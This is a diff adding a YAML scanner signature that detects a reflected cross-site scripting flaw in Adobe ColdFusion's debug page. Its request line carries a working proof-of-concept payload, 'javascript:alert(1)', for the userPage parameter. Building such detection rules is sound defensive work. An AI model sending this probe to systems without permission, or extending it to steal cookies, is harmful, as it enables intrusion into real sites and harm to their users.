@@ -1,0 +1,32 @@
+id: "coldfusion-debug-xss"
+name: "Adobe ColdFusion - Cross-Site Scripting"
+severity: "high"
+description: "Adobe ColdFusion debug page contains a cross-site scripting vulnerability when the application is running on a remote host. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks."
+tech:
+  - "generic"
+tags:
+  - "adobe"
+  - "coldfusion"
+  - "xss"
+  - "vuln"
+reference: "https://github.com/jaeles-project/jaeles-signatures/blob/master/common/coldfusion-debug-xss.yaml"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "\"cf_main_cf\" src=\"javascript:alert(1)\""
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+  - type: "status"
+    status:
+      - 200
